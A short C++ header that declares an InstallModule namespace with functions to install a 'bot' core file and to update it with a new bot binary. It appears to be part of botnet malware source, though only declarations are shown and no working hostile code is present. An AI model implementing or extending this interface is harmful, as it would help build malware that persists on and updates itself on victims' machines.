#pragma once

namespace InstallModule
{
	void init(void);
	void uninit(void);
	bool installBot(LPWSTR coreFile);
	bool updateBot(LPWSTR coreFile, BYTE * newBot, DWORD newBotSize);
};